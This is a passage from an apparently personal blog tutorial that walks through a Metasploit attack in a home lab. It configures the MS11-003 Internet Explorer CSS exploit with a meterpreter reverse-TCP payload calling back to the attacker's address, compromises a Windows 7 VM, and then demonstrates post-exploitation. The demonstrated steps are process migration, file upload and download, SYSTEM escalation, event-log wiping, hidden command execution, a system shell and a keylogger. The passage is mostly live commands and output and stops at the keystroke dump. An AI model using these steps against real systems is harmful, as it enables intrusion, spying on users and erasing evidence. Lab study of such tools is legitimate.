<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/browser/ms11_003_ie_css_import):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   OBFUSCATE  true             no        Enable JavaScript obfuscation
</span><span class='line'>   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL for incoming connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic</span></code></pre></td></tr></table></div></figure>


<p>And the description of what this exploit does:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Description:
</span><span class='line'>  This module exploits a memory corruption vulnerability within 
</span><span class='line'>  Microsoft\'s HTML engine (mshtml). When parsing an HTML page 
</span><span class='line'>  containing a recursive CSS import, a C++ object is deleted and later 
</span><span class='line'>  reused. This leads to arbitrary code execution. This exploit 
</span><span class='line'>  utilizes a combination of heap spraying and the .NET 2.0 
</span><span class='line'>  'mscorie.dll' module to bypass DEP and ASLR. This module does not 
</span><span class='line'>  opt-in to ASLR. As such, this module should be reliable on all 
</span><span class='line'>  Windows versions with .NET 2.0.50727 installed.</span></code></pre></td></tr></table></div></figure>


<p>All right, first I start the handler on my attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/Br8CNFRY
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] Local IP: http://192.168.80.155:8080/Br8CNFRY
</span><span class='line'>[*] Server started.</span></code></pre></td></tr></table></div></figure>


<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending redirect
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/RHHy0H.html"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending HTML
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/generic-1465040907.dll"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending .NET DLL
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending CSS
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 5 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49281) at 2016-06-04 07:48:33 -0400
</span><span class='line'>[*] Session ID 5 (192.168.80.155:4444 -&gt; 192.168.80.128:49281) processing InitialAutoRunScript 'migrate -f'
</span><span class='line'>[*] Current server process: iexplore.exe (2772)
</span><span class='line'>[*] Spawning notepad.exe process to migrate to
</span><span class='line'>[+] Migrating to 988
</span><span class='line'>[+] Successfully migrated to process </span></code></pre></td></tr></table></div></figure>


<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type                   Information                                Connection
</span><span class='line'>  --  ----                   -----------                                ----------
</span><span class='line'>  5   meterpreter x86/win32  WIN-D7GA2J1M0TU\wingoat @ WIN-D7GA2J1M0TU  192.168.80.155:4444 -&gt; 192.168.80.128:49281 (192.168.80.128)
</span><span class='line'>
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions -i 5
</span><span class='line'>[*] Starting interaction with 5...</span></code></pre></td></tr></table></div></figure>


<p>The reason I wanted to show Meterpreter on a Windows target is because there are many commands unique to Windows that we can use. I will demo them further</p>

<h2>Meterpreter commands</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; ?
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command                   Description
</span><span class='line'>    -------                   -----------
</span><span class='line'>    ?                         Help menu
</span><span class='line'>    background                Backgrounds the current session
</span><span class='line'>    bgkill                    Kills a background meterpreter script
</span><span class='line'>    bglist                    Lists running background scripts
</span><span class='line'>    bgrun                     Executes a meterpreter script as a background thread
</span><span class='line'>    channel                   Displays information or control active channels
</span><span class='line'>    close                     Closes a channel
</span><span class='line'>    disable_unicode_encoding  Disables encoding of unicode strings
</span><span class='line'>    enable_unicode_encoding   Enables encoding of unicode strings
</span><span class='line'>    exit                      Terminate the meterpreter session
</span><span class='line'>    get_timeouts              Get the current session timeout values
</span><span class='line'>    help                      Help menu
</span><span class='line'>    info                      Displays information about a Post module
</span><span class='line'>    irb                       Drop into irb scripting mode
</span><span class='line'>    load                      Load one or more meterpreter extensions
</span><span class='line'>    machine_id                Get the MSF ID of the machine attached to the session
</span><span class='line'>    migrate                   Migrate the server to another process
</span><span class='line'>    quit                      Terminate the meterpreter session
</span><span class='line'>    read                      Reads data from a channel
</span><span class='line'>    resource                  Run the commands stored in a file
</span><span class='line'>    run                       Executes a meterpreter script or Post module
</span><span class='line'>    set_timeouts              Set the current session timeout values
</span><span class='line'>    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span><span class='line'>    transport                 Change the current transport mechanism
</span><span class='line'>    use                       Deprecated alias for 'load'
</span><span class='line'>    uuid                      Get the UUID for the current session
</span><span class='line'>    write                     Writes data to a channel
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: File system Commands
</span><span class='line'>============================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    cat           Read the contents of a file to the screen
</span><span class='line'>    cd            Change directory
</span><span class='line'>    download      Download a file or directory
</span><span class='line'>    edit          Edit a file
</span><span class='line'>    getlwd        Print local working directory
</span><span class='line'>    getwd         Print working directory
</span><span class='line'>    lcd           Change local working directory
</span><span class='line'>    lpwd          Print local working directory
</span><span class='line'>    ls            List files
</span><span class='line'>    mkdir         Make directory
</span><span class='line'>    mv            Move source to destination
</span><span class='line'>    pwd           Print working directory
</span><span class='line'>    rm            Delete the specified file
</span><span class='line'>    rmdir         Remove directory
</span><span class='line'>    search        Search for files
</span><span class='line'>    show_mount    List all mount points/logical drives
</span><span class='line'>    upload        Upload a file or directory
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Networking Commands
</span><span class='line'>===========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    arp           Display the host ARP cache
</span><span class='line'>    getproxy      Display the current proxy configuration
</span><span class='line'>    ifconfig      Display interfaces
</span><span class='line'>    ipconfig      Display interfaces
</span><span class='line'>    netstat       Display the network connections
</span><span class='line'>    portfwd       Forward a local port to a remote service
</span><span class='line'>    route         View and modify the routing table
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: System Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    clearev       Clear the event log
</span><span class='line'>    drop_token    Relinquishes any active impersonation token.
</span><span class='line'>    execute       Execute a command
</span><span class='line'>    getenv        Get one or more environment variable values
</span><span class='line'>    getpid        Get the current process identifier
</span><span class='line'>    getprivs      Attempt to enable all privileges available to the current process
</span><span class='line'>    getsid        Get the SID of the user that the server is running as
</span><span class='line'>    getuid        Get the user that the server is running as
</span><span class='line'>    kill          Terminate a process
</span><span class='line'>    ps            List running processes
</span><span class='line'>    reboot        Reboots the remote computer
</span><span class='line'>    reg           Modify and interact with the remote registry
</span><span class='line'>    rev2self      Calls RevertToSelf() on the remote machine
</span><span class='line'>    shell         Drop into a system command shell
</span><span class='line'>    shutdown      Shuts down the remote computer
</span><span class='line'>    steal_token   Attempts to steal an impersonation token from the target process
</span><span class='line'>    suspend       Suspends or resumes a list of processes
</span><span class='line'>    sysinfo       Gets information about the remote system, such as OS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: User interface Commands
</span><span class='line'>===============================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    enumdesktops   List all accessible desktops and window stations
</span><span class='line'>    getdesktop     Get the current meterpreter desktop
</span><span class='line'>    idletime       Returns the number of seconds the remote user has been idle
</span><span class='line'>    keyscan_dump   Dump the keystroke buffer
</span><span class='line'>    keyscan_start  Start capturing keystrokes
</span><span class='line'>    keyscan_stop   Stop capturing keystrokes
</span><span class='line'>    screenshot     Grab a screenshot of the interactive desktop
</span><span class='line'>    setdesktop     Change the meterpreters current desktop
</span><span class='line'>    uictl          Control some of the user interface components
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Stdapi: Webcam Commands
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    record_mic     Record audio from the default microphone for X seconds
</span><span class='line'>    webcam_chat    Start a video chat
</span><span class='line'>    webcam_list    List webcams
</span><span class='line'>    webcam_snap    Take a snapshot from the specified webcam
</span><span class='line'>    webcam_stream  Play a video stream from the specified webcam
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Elevate Commands
</span><span class='line'>======================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    getsystem     Attempt to elevate your privilege to that of local system.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Password database Commands
</span><span class='line'>================================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    hashdump      Dumps the contents of the SAM database
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Priv: Timestomp Commands
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    timestomp     Manipulate file MACE attributes</span></code></pre></td></tr></table></div></figure>


<p>The first thing I will do is migrate to the Windows Explorer process, because a stray Notepad might look suspicious. I got the PID from doing a <em>ps</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; migrate 1408
</span><span class='line'>[*] Migrating from 988 to 1408...
</span><span class='line'>[*] Migration completed successfully.
</span><span class='line'>meterpreter &gt; getpid
</span><span class='line'>Current pid: 1408</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 5...
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; echo 'HA HA HA' &gt; read.txt
</span><span class='line'>[*] exec: echo 'HA HA HA' &gt; read.txt
</span><span class='line'>
</span><span class='line'>meterpreter &gt; upload /root/read.txt C:\
</span><span class='line'>[*] uploading  : /root/read.txt -&gt; C:\
</span><span class='line'>[*] uploaded   : /root/read.txt -&gt; C:\\read.txt
</span><span class='line'>meterpreter &gt; cd C:\
</span><span class='line'>meterpreter &gt; cat read.txt
</span><span class='line'>HA HA HA</span></code></pre></td></tr></table></div></figure>


<p>Ok, now I will download something on my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download desktop.ini
</span><span class='line'>[*] downloading: desktop.ini -&gt; desktop.ini
</span><span class='line'>[*] download   : desktop.ini -&gt; desktop.ini
</span><span class='line'>meterpreter &gt; cat desktop.ini
</span><span class='line'>��
</span><span class='line'>[.ShellClassInfo]
</span><span class='line'>LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s now look at some system information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : WIN-D7GA2J1M0TU
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64
</span><span class='line'>System Language : en_US
</span><span class='line'>Domain          : WORKGROUP
</span><span class='line'>Logged On Users : 1
</span><span class='line'>Meterpreter     : x64/win64</span></code></pre></td></tr></table></div></figure>


<p>I attempted to get system privileges and it worked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to clear the event log of the machine, though that is anything but stealthy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clearev
</span><span class='line'>[*] Wiping 1583 records from Application...
</span><span class='line'>[*] Wiping 5436 records from System...
</span><span class='line'>[*] Wiping 1422 records from Security...</span></code></pre></td></tr></table></div></figure>


<p>We can also execute native commands on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; execute -h
</span><span class='line'>Usage: execute -f file [options]
</span><span class='line'>
</span><span class='line'>Executes a command on the remote machine.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -H        Create the process hidden from view.
</span><span class='line'>    -a &lt;opt&gt;  The arguments to pass to the command.
</span><span class='line'>    -c        Channelized I/O (required for interaction).
</span><span class='line'>    -d &lt;opt&gt;  The 'dummy' executable to launch when using -m.
</span><span class='line'>    -f &lt;opt&gt;  The executable command to run.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -i        Interact with the process after creating it.
</span><span class='line'>    -k        Execute process on the meterpreters current desktop
</span><span class='line'>    -m        Execute from memory.
</span><span class='line'>    -s &lt;opt&gt;  Execute process in a given session as the session user
</span><span class='line'>    -t        Execute process with currently impersonated thread token
</span><span class='line'>
</span><span class='line'>meterpreter &gt; execute -f "ipconfig /flushdns" -i -H
</span><span class='line'>Process 2016 created.
</span><span class='line'>Channel 3 created.
</span><span class='line'>
</span><span class='line'>Windows IP Configuration
</span><span class='line'>
</span><span class='line'>Successfully flushed the DNS Resolver Cache.</span></code></pre></td></tr></table></div></figure>


<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; reg -h
</span><span class='line'>Usage: reg [command] [options]
</span><span class='line'>
</span><span class='line'>Interact with the target machine's registry.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -d &lt;opt&gt;  The data to store in the registry value.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).
</span><span class='line'>    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials
</span><span class='line'>    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).
</span><span class='line'>    -v &lt;opt&gt;  The registry value name (E.g. Stuff).
</span><span class='line'>    -w        Set KEY_WOW64 flag, valid values [32|64].
</span><span class='line'>
</span><span class='line'>COMMANDS:
</span><span class='line'>
</span><span class='line'>    enumkey   Enumerate the supplied registry key [-k &lt;key&gt;]
</span><span class='line'>    createkey Create the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    deletekey Delete the supplied registry key  [-k &lt;key&gt;]
</span><span class='line'>    queryclass Queries the class of the supplied key [-k &lt;key&gt;]
</span><span class='line'>    setval    Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]
</span><span class='line'>    deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]
</span><span class='line'>    queryval  Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span></code></pre></td></tr></table></div></figure>


<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process 2368 created.
</span><span class='line'>Channel 5 created.
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Windows\system32&gt;</span></code></pre></td></tr></table></div></figure>


<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; enumdesktops
</span><span class='line'>Enumerating all accessible desktops
</span><span class='line'>
</span><span class='line'>Desktops
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>    Session  Station  Name
</span><span class='line'>    -------  -------  ----
</span><span class='line'>    1        WinSta0  Default
</span><span class='line'>    1        WinSta0  Disconnect
</span><span class='line'>    1        WinSta0  Winlogon
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getdesktop
</span><span class='line'>Session 1\W\D</span></code></pre></td></tr></table></div></figure>


<p>See how long the user has been idle:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; idletime
</span><span class='line'>User has been idle for: 5 mins 10 secs</span></code></pre></td></tr></table></div></figure>


<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; keyscan_start 
</span><span class='line'>Starting the keystroke sniffer...</span></code></pre></td></tr></table></div></figure>


<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
